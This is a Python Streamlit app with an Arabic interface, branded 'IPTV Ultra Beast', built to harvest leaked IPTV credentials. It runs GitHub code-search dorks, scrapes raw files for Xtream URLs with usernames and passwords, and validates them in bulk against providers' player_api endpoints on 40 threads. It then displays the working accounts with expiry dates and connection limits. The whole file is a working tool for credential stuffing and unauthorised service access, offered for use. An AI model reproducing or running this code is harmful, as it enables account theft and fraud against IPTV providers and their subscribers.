import streamlit as st
import requests
import re
import time
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime

# =================================================
# 1. إعدادات الأمان وكلمة المرور
# =================================================
# يمكنك تغيير كلمة المرور من هنا
LOGIN_PASSWORD = "BEAST_V14_USER" 

def check_password():
    """تحقق من كلمة المرور ويعيد True إذا كانت صحيحة"""
    if "password_correct" not in st.session_state:
        st.session_state.password_correct = False

    if st.session_state.password_correct:
        return True

    # واجهة تسجيل الدخول
    st.markdown("<h1 style='text-align: center; color: #00E676;'>🔐 نظام الوصول الآمن</h1>", unsafe_allow_html=True)
    with st.container():
        cols = st.columns([1, 2, 1])
        with cols[1]:
            pwd = st.text_input("أدخل كلمة المرور الخاصة بك:", type="password")
            if st.button("دخول للنظام", use_container_width=True):
                if pwd == LOGIN_PASSWORD:
                    st.session_state.password_correct = True
                    st.rerun()
                else:
                    st.error("❌ كلمة المرور غير صحيحة!")
    return False

# إذا لم يتم تسجيل الدخول، توقف هنا
if not check_password():
    st.stop()

# =================================================
# 2. إعدادات الصفحة والواجهة (بعد الدخول)
# =================================================
st.set_page_config(
    page_title="IPTV Ultra Beast - Private",
    page_icon="🌪️",
    layout="wide"
)

# تنسيق مخصص (CSS)
st.markdown("""
<style>
    .stApp { background-color: #0E1117; color: #00FF41; }
    .result-card {
        padding: 15px;
        border-radius: 8px;
        background-color: #161B22;
        border: 1px solid #30363D;
        margin-bottom: 12px;
        font-family: 'Courier New', monospace;
    }
    .status-active { color: #00FF41; font-weight: bold; }
</style>
""", unsafe_allow_html=True)

# إدارة الحالة
if 'is_hunting' not in st.session_state: st.session_state.is_hunting = False
if 'results' not in st.session_state: st.session_state.results = []
if 'unique_cache' not in st.session_state: st.session_state.unique_cache = set()
if 'checked_count' not in st.session_state: st.session_state.checked_count = 0

# =================================================
# 3. دوال المعالجة والبحث (المحسنة)
# =================================================

def check_xtream_worker(host, user, pw):
    u_id = f"{host}{user}{pw}"
    if u_id in st.session_state.unique_cache: return None
    st.session_state.unique_cache.add(u_id)

    try:
        # فحص البروتوكول والتأكد من صيغة الرابط
        if not host.startswith('http'): host = f"http://{host}"
        api_url = f"{host}/player_api.php?username={user}&password={pw}"
        
        r = requests.get(api_url, timeout=4).json()
        if r.get("user_info", {}).get("status") == "Active":
            info = r["user_info"]
            # تحويل تاريخ الانتهاء
            exp_ts = info.get('exp_date')
            exp = datetime.fromtimestamp(int(exp_ts)).strftime('%Y-%m-%d') if exp_ts and str(exp_ts).isdigit() else "Unlimited"
            
            return {
                "host": host, "user": user, "pass": pw,
                "exp": exp, "conn": f"{info.get('active_cons', 0)}/{info.get('max_connections', 1)}"
            }
    except: pass
    return None

def start_engine(token):
    headers = {'Authorization': f'token {token}', 'Accept': 'application/vnd.github.v3+json'}
    
    # كلمات بحث "Dorks" محسنة لجلب نتائج طازجة
    massive_dorks = [
        'extension:txt "get.php?username=" "password="',
        'extension:m3u "player_api.php" user pass',
        'filename:iptv_list.txt "http"',
        '"http://" "user" "pass" "port" extension:txt'
    ]

    status_area = st.empty()
    
    with ThreadPoolExecutor(max_workers=40) as executor:
        for dork in massive_dorks:
            if not st.session_state.is_hunting: break
            
            for page in range(1, 11): # فحص 10 صفحات لكل كلمة بحث
                if not st.session_state.is_hunting: break
                status_area.info(f"🔎 جاري مسح المصدر: {dork} | صفحة: {page}")
                
                try:
                    search_url = f"https://api.github.com/search/code?q={dork}&page={page}&per_page=100"
                    res = requests.get(search_url, headers=headers).json()
                    
                    if 'items' in res:
                        for item in res['items']:
                            if not st.session_state.is_hunting: break
                            raw_url = item['html_url'].replace('github.com', 'raw.githubusercontent.com').replace('/blob/', '/')
                            
                            try:
                                content = requests.get(raw_url, timeout=3).text
                                # Regex مطور لصيد أدق للبيانات
                                pattern = r"(https?://[\w\.-]+:\d+)/(?:get|player_api)\.php\?username=([\w\.-]+)&password=([\w\.-]+)"
                                matches = re.findall(pattern, content)
                                
                                for m in matches:
                                    st.session_state.checked_count += 1
                                    # التحقق من الحساب
                                    found = check_xtream_worker(m[0], m[1], m[2])
                                    if found:
                                        st.session_state.results.insert(0, found)
                                        st.toast(f"✅ تم صيد حساب: {found['host']}", icon="💎")
                                        st.rerun() # تحديث الواجهة فوراً عند كل نتيجة
                            except: continue
                except: time.sleep(2); continue

# =================================================
# 4. بناء الواجهة (Sidebar & Main)
# =================================================

with st.sidebar:
    st.image("https://cdn-icons-png.flaticon.com/512/7032/7032431.png", width=100)
    st.title("ULTRA BEAST V14")
    st.markdown("---")
    
    gh_token = st.text_input("GitHub Token:", type="password", placeholder="ghp_xxxx...")
    
    if not st.session_state.is_hunting:
        if st.button("🚀 بدء الصيد المليوني", use_container_width=True):
            if gh_token:
                st.session_state.is_hunting = True
                st.rerun()
            else:
                st.warning("⚠️ أدخل التوكن أولاً")
    else:
        if st.button("🛑 إيقاف المحرك", use_container_width=True):
            st.session_state.is_hunting = False
            st.rerun()

    st.markdown(f"### 📊 الإحصائيات")
    st.write(f"🔍 تم فحص: `{st.session_state.checked_count}`")
    st.write(f"💎 حسابات نشطة: `{len(st.session_state.results)}`")

# منطقة العرض الرئيسية
st.subheader("📺 النتائج النشطة (Live Content)")

if st.session_state.is_hunting:
    start_engine(gh_token)

if not st.session_state.results:
    st.info("لم يتم العثور على نتائج نشطة بعد. تأكد من أن المحرك يعمل.")
else:
    for item in st.session_state.results:
        st.markdown(f"""
        <div class="result-card">
            <span class="status-active">✅ ACTIVE</span> | 📅 Exp: {item['exp']} | 👥 Conn: {item['conn']}<br>
            <b>URL:</b> {item['host']}<br>
            <b>USER:</b> <code style='color:#E67E22'>{item['user']}</code> | <b>PASS:</b> <code style='color:#E67E22'>{item['pass']}</code>
        </div>
        """, unsafe_allow_html=True)
